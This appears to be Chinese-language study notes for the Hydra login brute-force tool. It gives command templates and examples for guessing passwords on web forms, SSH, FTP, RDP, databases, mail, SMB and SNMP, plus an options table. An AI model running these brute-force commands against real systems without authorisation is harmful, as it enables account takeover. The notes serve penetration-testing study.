# Hydra 常用协议攻击指令速查笔记

Hydra 是一个支持多种网络服务的登录爆破工具，其核心命令结构为：
```bash
hydra [全局选项] 目标[:端口] 模块 "模块参数"
```

本文按协议分类，整理典型指令格式，并解释参数含义。

---
# 一、HTTP / HTTPS 表单类

### 1. `http-post-form` / `https-post-form`

用于破解基于 POST 方法的 Web 登录表单。
```bash
hydra -l <用户名> -P <密码字典> <目标IP[:端口]> http-post-form "路径:参数字符串:失败/成功判断条件"
```

**参数解释**：

- **路径**：登录页面的相对路径（以 `/` 开头），如 `/login.php`。
- **参数字符串**：POST 请求体的内容，格式为 `key1=value1&key2=value2`，其中用 `^USER^` 和 `^PASS^` 作为用户名和密码的占位符。可包含固定字段，例如 `username=^USER^&password=^PASS^&submit=Login`。
- **判断条件**：
	- 最简单形式：直接写一个字符串，Hydra 认为响应中包含该字符串则表示**失败**，否则成功。
    - 精确形式：`F=<失败特征>` 或 `S=<成功特征>`。例如 `F=error` 表示响应中出现 “error” 即失败；`S=welcome` 表示出现 “welcome” 即成功。

**示例**：
```bash
hydra -l admin -P pass.txt 192.168.1.100:8080 http-post-form "/login:user=^USER^&pass=^PASS^:Login failed"
```
### 2. `http-get-form`

与 `http-post-form` 类似，用于 GET 方式的登录表单。参数字符串直接附加在路径后面，用 `?` 连接。
```bash
hydra -l admin -P pass.txt 192.168.1.100 http-get-form "/login.php?user=^USER^&pass=^PASS^:F=error"
```
### 3. `http-head` / `https-head`
用于发送 HEAD 请求并检查响应，通常用于验证页面是否存在或判断状态码，不常用作登录爆破。

---

# 二、远程登录类

### 1. SSH
```bash
hydra -l <用户名> -P <密码字典> ssh://<目标IP[:端口]>
```
- **端口**：默认为 22，可省略
- **模块名**：`ssh`
**示例**：
```bash
hydra -l root -P pass.txt ssh://192.168.1.100
```
### 2. FTP
```bash
hydra -l <用户名> -P <密码字典> ftp://<目标IP[:端口]>
```
### 3. Telnet
```bash
hydra -l <用户名> -P <密码字典> telnet://<目标IP[:端口]>
```
### 4. RDP (Windows 远程桌面)
```bash
hydra -l <用户名> -P <密码字典> rdp://<目标IP[:端口]>
```
- 注意：Hydra 对 RDP 的支持可能有限，部分版本需要额外编译。

---

# 三、数据库类

### 1. MySQL
```bash
hydra -l <用户名> -P <密码字典> mysql://<目标IP[:端口]>
```
- 默认端口 3306
### 2. PostgreSQL
```bash
hydra -l <用户名> -P <密码字典> postgresql://<目标IP[:端口]>
```
### 3. MSSQL
```bash
hydra -l <用户名> -P <密码字典> mssql://<目标IP[:端口]>
```
### 4. Redis
```bash
hydra -P <密码字典> redis://<目标IP[:端口]>
```
- Redis 通常无用户名，只需密码。

---
# 四、邮件服务类

### 1. POP3 / POP3S
```bash
hydra -l <用户名> -P <密码字典> pop3://<目标IP[:端口]>
```
### 2. IMAP / IMAPS
```bash
hydra -l <用户名> -P <密码字典> imap://<目标IP[:端口]>
```
### 3. SMTP
```bash
hydra -l <用户名> -P <密码字典> smtp://<目标IP[:端口]>
```
---
# 五、网络基础服务

### 1. SMB (Windows 文件共享)
```bash
hydra -l <用户名> -P <密码字典> smb://<目标IP>
```
- 端口通常为 445 或 139
### 2. SNMP
```bash
hydra -P <密码字典> snmp://<目标IP[:端口]>
```
- SNMP v1/v2 使用 community string，可用 `-l` 指定 community 名

---

# 六、其他常见模块
- **cisco**：Cisco 设备 enable 密码爆破。
- **vnc**：VNC 远程桌面密码爆破。
- **pcanywhere**：pcAnywhere 服务。

格式统一为：
```bash
hydra -l <用户名> -P <密码字典> <模块名>://<目标IP[:端口]>
```
若模块支持附加参数，可在模块名后加冒号和参数（如 `http-post-form` 的引号内容）。

---
# 七、常用全局选项（适用于所有模块）

|选项|说明|
|---|---|
|`-l`|指定单个用户名|
|`-L`|指定用户名字典文件|
|`-p`|指定单个密码|
|`-P`|指定密码字典文件|
|`-t`|并发线程数（默认 16）|
|`-w`|超时时间（秒，默认 30）|
|`-W`|尝试间隔（毫秒）|
|`-v` / `-V`|显示详细信息 / 每次尝试的输出|
|`-o`|输出结果到文件|
|`-f`|找到第一个有效密码后停止|
|`-s`|指定端口（若目标中未指定）|
|`-e nsr`|尝试额外组合：n=空密码，s=用户名即密码，r=反向用户名|